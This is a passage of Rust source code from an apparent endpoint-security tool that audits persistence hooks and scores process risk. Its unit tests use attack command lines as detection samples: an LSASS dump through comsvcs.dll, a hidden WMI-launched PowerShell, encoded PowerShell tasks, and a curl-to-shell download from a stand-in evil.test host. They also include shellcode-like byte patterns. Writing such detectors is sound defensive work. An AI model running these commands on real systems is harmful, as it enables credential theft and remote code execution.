                        hooks.push(PersistenceEntry {
                            location_type: "Systemd User Service".to_string(),
                            name: entry.file_name().to_string_lossy().to_string(),
                            path: path.to_string_lossy().to_string(),
                            command_or_detail: exec_line,
                            status: status.to_string(),
                        });
                    }
                }
            }
        }
    }

    if let Some(data_roaming) = dirs::data_dir() {
        let win_startup: PathBuf = data_roaming
            .join("Microsoft")
            .join("Windows")
            .join("Start Menu")
            .join("Programs")
            .join("Startup");
        if win_startup.exists() {
            if let Ok(entries) = fs::read_dir(&win_startup) {
                for entry in entries.flatten() {
                    let p = entry.path();
                    hooks.push(PersistenceEntry {
                        location_type: "Windows Startup Folder".to_string(),
                        name: entry.file_name().to_string_lossy().to_string(),
                        path: p.to_string_lossy().to_string(),
                        command_or_detail: "Startup Shortcut / Binary".to_string(),
                        status: "Verified".to_string(),
                    });
                }
            }
        }
    }

    #[cfg(target_os = "windows")]
    audit_windows_registry_run_keys(&mut hooks);

    #[cfg(target_os = "windows")]
    audit_windows_scheduled_tasks(&mut hooks);

    if let Some(home) = dirs::home_dir() {
        for profile_name in [".bashrc", ".profile", ".zshrc"] {
            let profile_path = home.join(profile_name);
            if profile_path.exists() {
                let content = fs::read_to_string(&profile_path).unwrap_or_default();
                let suspicious_lines: Vec<&str> = content
                    .lines()
                    .filter(|l| {
                        let t = l.trim();
                        !t.is_empty() && !t.starts_with('#') && is_suspicious_persistence_cmd(t)
                    })
                    .collect();
                let status = if suspicious_lines.is_empty() {
                    "Verified"
                } else {
                    "Suspicious"
                };
                hooks.push(PersistenceEntry {
                    location_type: "Shell Profile Hook".to_string(),
                    name: profile_name.to_string(),
                    path: profile_path.to_string_lossy().to_string(),
                    command_or_detail: if suspicious_lines.is_empty() {
                        "No anomalous network or preload hooks found".to_string()
                    } else {
                        suspicious_lines.join("; ")
                    },
                    status: status.to_string(),
                });
            }
        }
    }

    #[cfg(target_os = "linux")]
    {
        let preload_path = Path::new("/etc/ld.so.preload");
        if preload_path.exists() {
            let content = fs::read_to_string(preload_path).unwrap_or_default();
            let entries: Vec<&str> = content
                .lines()
                .map(str::trim)
                .filter(|l| !l.is_empty() && !l.starts_with('#'))
                .collect();
            hooks.push(PersistenceEntry {
                location_type: "Linux Shared Library Preload".to_string(),
                name: "ld.so.preload".to_string(),
                path: "/etc/ld.so.preload".to_string(),
                command_or_detail: if entries.is_empty() {
                    "Empty / Clean".to_string()
                } else {
                    entries.join("; ")
                },
                status: if entries.is_empty() {
                    "Verified".to_string()
                } else {
                    "Suspicious".to_string()
                },
            });
        }

        let crontab_path = Path::new("/etc/crontab");
        if crontab_path.exists() {
            let content = fs::read_to_string(crontab_path).unwrap_or_default();
            let suspect_jobs: Vec<&str> = content
                .lines()
                .map(str::trim)
                .filter(|l| !l.is_empty() && !l.starts_with('#') && is_suspicious_persistence_cmd(l))
                .collect();
            hooks.push(PersistenceEntry {
                location_type: "System Crontab".to_string(),
                name: "crontab".to_string(),
                path: "/etc/crontab".to_string(),
                command_or_detail: if suspect_jobs.is_empty() {
                    "No suspicious scheduled commands found".to_string()
                } else {
                    suspect_jobs.join("; ")
                },
                status: if suspect_jobs.is_empty() {
                    "Verified".to_string()
                } else {
                    "Suspicious".to_string()
                },
            });
        }
    }

    hooks
}

/// Evaluate a Windows Scheduled Task XML file definition for suspicious persistence commands.
pub fn evaluate_scheduled_task_xml(
    task_name: &str,
    task_path: &str,
    xml_content: &str,
) -> PersistenceEntry {
    let lower = xml_content.to_ascii_lowercase();
    let suspect = is_suspicious_persistence_cmd(&lower);
    let snippet = xml_content
        .lines()
        .find(|l| {
            let t = l.trim().to_ascii_lowercase();
            t.contains("<command>") || t.contains("<arguments>")
        })
        .map(|l| l.trim().to_string())
        .unwrap_or_else(|| "Custom Scheduled Task XML".to_string());
    PersistenceEntry {
        location_type: "Windows Scheduled Task".to_string(),
        name: task_name.to_string(),
        path: task_path.to_string(),
        command_or_detail: snippet,
        status: if suspect {
            "Suspicious".to_string()
        } else {
            "Verified".to_string()
        },
    }
}

#[cfg(target_os = "windows")]
fn read_task_xml_string(path: &Path) -> Option<String> {
    let raw = fs::read(path).ok()?;
    if raw.len() >= 2 && raw[0] == 0xFF && raw[1] == 0xFE {
        let units: Vec<u16> = raw[2..]
            .chunks_exact(2)
            .map(|c| u16::from_le_bytes([c[0], c[1]]))
            .collect();
        return Some(String::from_utf16_lossy(&units));
    }
    Some(String::from_utf8_lossy(&raw).to_string())
}

#[cfg(target_os = "windows")]
fn audit_windows_scheduled_tasks(hooks: &mut Vec<PersistenceEntry>) {
    let tasks_root = std::env::var_os("SystemRoot")
        .map(PathBuf::from)
        .unwrap_or_else(|| PathBuf::from(r"C:\Windows"))
        .join("System32")
        .join("Tasks");
    if !tasks_root.exists() {
        return;
    }

    let mut inspected = 0usize;
    for entry in walkdir::WalkDir::new(&tasks_root)
        .max_depth(5)
        .follow_links(false)
        .into_iter()
        .flatten()
    {
        if inspected >= 256 {
            break;
        }
        let p = entry.path();
        if !p.is_file() {
            continue;
        }
        let rel = p
            .strip_prefix(&tasks_root)
            .map(|r| r.to_string_lossy().to_string())
            .unwrap_or_else(|_| entry.file_name().to_string_lossy().to_string());
        let lower_rel = rel.to_ascii_lowercase();
        // Skip built-in Microsoft\Windows OS maintenance schedules while auditing root & nested vendor/custom folders
        if lower_rel.starts_with("microsoft\\windows\\")
            || lower_rel.starts_with("microsoft/windows/")
        {
            continue;
        }
        let Some(content) = read_task_xml_string(p) else {
            continue;
        };
        inspected += 1;
        hooks.push(evaluate_scheduled_task_xml(
            &rel,
            &p.to_string_lossy(),
            &content,
        ));
    }
}

#[cfg(test)]
mod process_guard_tests {
    use super::{
        evaluate_process_risk, evaluate_process_risk_with_ancestors,
        evaluate_process_risk_with_parent, evaluate_scheduled_task_xml,
    };

    #[test]
    fn asr_detects_credential_dumping_wmi_parent_child_and_scheduled_tasks() {
        let (risk_lsass, reason_lsass) = evaluate_process_risk(
            "rundll32.exe",
            r"C:\Windows\System32\rundll32.exe",
            r"C:\Windows\System32\comsvcs.dll, MiniDump 612 C:\temp\lsass.dmp full",
        );
        assert_eq!(risk_lsass, "Critical");
        assert!(reason_lsass.contains("Credential dumping"));

        let (risk_wmi, reason_wmi) = evaluate_process_risk(
            "wmic.exe",
            r"C:\Windows\System32\wbem\wmic.exe",
            "wmic process call create \"powershell -nop -w hidden\"",
        );
        assert_eq!(risk_wmi, "Critical");
        assert!(reason_wmi.contains("WMI"));

        // Tightened schtasks rule allows normal Program Files scheduled task and catches payload dropper
        let (safe_sched, _) = evaluate_process_risk(
            "schtasks.exe",
            r"C:\Windows\System32\schtasks.exe",
            r#"schtasks /create /tn DailyBackup /tr "C:\Program Files\Backup\run.exe""#,
        );
        assert_eq!(safe_sched, "Safe");

        let (bad_sched, _) = evaluate_process_risk(
            "schtasks.exe",
            r"C:\Windows\System32\schtasks.exe",
            r#"schtasks /create /tn Updater /tr "powershell -enc SQBFAFgA""#,
        );
        assert_eq!(bad_sched, "Critical");

        // Parent-child rule: Office spawning powershell is Critical; LibreOffice spawning benign lpr via sh is Safe
        let (office_child, reason_office) = evaluate_process_risk_with_parent(
            "powershell.exe",
            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "powershell.exe",
            Some("winword.exe"),
        );
        assert_eq!(office_child, "Critical");
        assert!(reason_office.contains("winword.exe"));

        // Multi-ancestor chain: WINWORD.EXE -> explorer/conhost -> powershell.exe
        let ancestors = vec!["conhost.exe".to_string(), "WINWORD.EXE".to_string()];
        let (grandchild_risk, grandchild_reason) = evaluate_process_risk_with_ancestors(
            "powershell.exe",
            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "powershell.exe -NoLogo",
            &ancestors,
        );
        assert_eq!(grandchild_risk, "Critical");
        assert!(grandchild_reason.contains("WINWORD.EXE"));

        // Linux PDF reader spawning shell with curl payload is Critical; benign lpr is Safe
        let (evince_bad, _) = evaluate_process_risk_with_parent(
            "sh",
            "/bin/sh",
            "sh -c 'curl https://evil.test/drop.sh | sh'",
            Some("evince"),
        );
        assert_eq!(evince_bad, "Critical");

        let (soffice_benign, _) = evaluate_process_risk_with_parent(
            "sh",
            "/bin/sh",
            "sh -c lpr document.ps",
            Some("soffice.bin"),
        );
        assert_eq!(soffice_benign, "Safe");

        // Clicking a normal hyperlink in evince/okular spawns xdg-open with https:// — must be Safe
        let (evince_xdg_open, _) = evaluate_process_risk_with_parent(
            "sh",
            "/bin/sh",
            "sh /usr/bin/xdg-open https://example.com/paper.pdf",
            Some("evince"),
        );
        assert_eq!(evince_xdg_open, "Safe");

        // Unrelated tools using -e or /E:ON (even when 'powershell' appears as a filename/string) must be Safe
        let (cmd_eon, _) = evaluate_process_risk(
            "cmd.exe",
            r"C:\Windows\System32\cmd.exe",
            r"cmd.exe /E:ON /V:ON /c echo build_powershell_docs",
        );
        assert_eq!(cmd_eon, "Safe");

        let (grep_ps, _) = evaluate_process_risk(
            "grep",
            "/usr/bin/grep",
            "grep -e powershell_notes README.md",
        );
        assert_eq!(grep_ps, "Safe");

        // Prefix-shortened PowerShell -e and -enco are Critical when PowerShell is the host
        let (ps_short_e, _) = evaluate_process_risk(
            "powershell.exe",
            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "powershell.exe -NoP -e SQBFAFgA",
        );
        assert_eq!(ps_short_e, "Critical");

        // 7-Zip / Firefox SFX temp installer stub in AppData\Local\Temp is Suspicious (file-scanned, NOT auto-killed as Critical)
        let (sfx_stub_risk, _) = evaluate_process_risk(
            "setup-stub.exe",
            r"C:\Users\Alice\AppData\Local\Temp\7zS0E9E0266\setup-stub.exe",
            r"C:\Users\Alice\AppData\Local\Temp\7zS0E9E0266\setup-stub.exe",
        );
        assert_eq!(sfx_stub_risk, "Suspicious");

        // Genesis Seek binary or msiexec.exe running from Temp / System32 is Safe
        let (gs_temp_risk, _) = evaluate_process_risk(
            "genesis-seek.exe",
            r"C:\Users\Alice\AppData\Local\Temp\7zO495FEBC5\genesis-seek.exe",
            r"C:\Users\Alice\AppData\Local\Temp\7zO495FEBC5\genesis-seek.exe",
        );
        assert_eq!(gs_temp_risk, "Safe");

        let (msiexec_risk, _) = evaluate_process_risk(
            "msiexec.exe",
            r"C:\Windows\System32\msiexec.exe",
            r#"msiexec.exe /i "C:\Users\Alice\Downloads\Genesis.Seek_0.3.8_x64_en-US.msi""#,
        );
        assert_eq!(msiexec_risk, "Safe");

        // Linux /dev/shm/ volatile RAM disk execution remains Critical
        let (shm_risk, _) = evaluate_process_risk(
            "dropper",
            "/dev/shm/dropper",
            "/dev/shm/dropper --daemon",
        );
        assert_eq!(shm_risk, "Critical");

        // Scheduled task XML audit
        let sus_task = evaluate_scheduled_task_xml(
            "SysHealthCheck",
            r"C:\Windows\System32\Tasks\SysHealthCheck",
            "<Task><Actions><Exec><Command>powershell.exe</Command><Arguments>-EncodedCommand QQ==</Arguments></Exec></Actions></Task>",
        );
        assert_eq!(sus_task.status, "Suspicious");

        let clean_task = evaluate_scheduled_task_xml(
            "EdgeUpdate",
            r"C:\Windows\System32\Tasks\EdgeUpdate",
            r"<Task><Actions><Exec><Command>C:\Program Files\Edge\update.exe</Command></Exec></Actions></Task>",
        );
        assert_eq!(clean_task.status, "Verified");
    }

    #[test]
    fn memory_guard_detects_hollowed_pe_mz_stomped_elf_and_reflective_shellcode_without_jit_fp() {
        use super::inspect_unbacked_executable_memory;

        // 1. Unbacked x64 PE image in private executable memory (Process Hollowing / Reflective DLL)
        let mut pe_region = vec![0u8; 256];
        pe_region[0] = b'M';
        pe_region[1] = b'Z';
        pe_region[0x3C..0x40].copy_from_slice(&0x80u32.to_le_bytes());
        pe_region[0x80..0x84].copy_from_slice(b"PE\x00\x00");
        pe_region[0x84..0x86].copy_from_slice(&0x8664u16.to_le_bytes());
        let det_pe = inspect_unbacked_executable_memory("svchost.exe", &pe_region);
        assert!(
            det_pe
                .as_deref()
                .unwrap_or("")
                .contains("Unbacked executable PE image"),
            "Expected unbacked PE detection, got {:?}",
            det_pe
        );

        // 2. MZ-stomped Cobalt Strike beacon (bytes 0..2 zeroed out, DOS stub + PE\0\0 intact)
        let mut stomped_pe = pe_region.clone();
        stomped_pe[0] = 0;
        stomped_pe[1] = 0;
        stomped_pe[0x40..0x40 + 38]
            .copy_from_slice(b"This program cannot be run in DOS mode");
        let det_stomped = inspect_unbacked_executable_memory("rundll32.exe", &stomped_pe);
        assert!(
            det_stomped
                .as_deref()
                .unwrap_or("")
                .contains("Unbacked executable PE image")
        );

        // 3. Unbacked ELF64 image in anonymous memory
        let mut elf_region = vec![0u8; 128];
        elf_region[0..6].copy_from_slice(b"\x7FELF\x02\x01");
        let det_elf = inspect_unbacked_executable_memory("cron", &elf_region);
        assert!(
            det_elf
                .as_deref()
                .unwrap_or("")
                .contains("Unbacked executable ELF image")
        );

        // 4. Stephen Fewer x64 block-API hash shellcode prologue + PEB walk
        let mut shellcode = vec![0x90u8; 128];
        shellcode[0..6].copy_from_slice(&[0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8]);
        shellcode[24..29].copy_from_slice(&[0x65, 0x48, 0x8B, 0x52, 0x60]);
        let det_sc = inspect_unbacked_executable_memory("notepad.exe", &shellcode);
        assert!(
            det_sc
                .as_deref()
                .unwrap_or("")
                .contains("Reflective Loader / PEB-walk shellcode")
        );

        // 5. Benign V8/SpiderMonkey/.NET JIT machine code page must NOT false-positive
        let mut jit_page = vec![0xCCu8; 256];
        jit_page[0..12]
            .copy_from_slice(&[0x55, 0x48, 0x89, 0xE5, 0x48, 0x83, 0xEC, 0x20, 0x89, 0x7D, 0xFC, 0xC3]);
        assert!(inspect_unbacked_executable_memory("chrome.exe", &jit_page).is_none());

        #[cfg(target_os = "windows")]
        {
            assert_eq!(
                std::mem::size_of::<super::MemoryBasicInformation>(),
                48,
                "x64 Windows MEMORY_BASIC_INFORMATION layout must be 48 bytes"
            );
        }
    }
}
